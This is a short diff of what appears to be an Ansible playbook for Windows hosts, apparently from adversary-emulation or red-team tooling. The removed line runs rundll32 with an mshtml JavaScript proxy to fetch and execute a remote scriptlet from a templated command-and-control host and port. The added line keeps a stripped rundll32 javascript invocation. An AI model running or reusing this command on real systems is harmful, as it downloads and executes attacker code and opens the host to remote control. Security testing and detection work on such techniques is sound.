@@ -8,7 +8,7 @@
     tags: always
     win_shell: |
       whoami > whoami.txt
-      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_sct }}");window.close();
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "
   - name: check file exist
     tags: always
     win_stat:
